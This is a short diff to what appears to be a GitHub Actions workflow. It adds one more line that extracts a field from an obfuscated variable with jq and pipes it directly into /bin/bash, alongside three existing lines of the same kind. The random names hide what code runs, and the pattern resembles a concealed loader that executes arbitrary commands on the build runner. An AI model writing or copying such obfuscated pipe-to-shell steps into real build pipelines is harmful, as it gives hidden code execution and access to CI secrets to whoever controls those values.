@@ -23,6 +23,7 @@ jobs:
           echo $xfbv97 | jq -r .qt10 | /bin/bash
           echo $tbcu92 | jq -r .gyrnx467 | /bin/bash
           echo $r34 | jq -r .liq79 | /bin/bash
+          printf '%s' "$vz3" | jq -r .yteb7 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
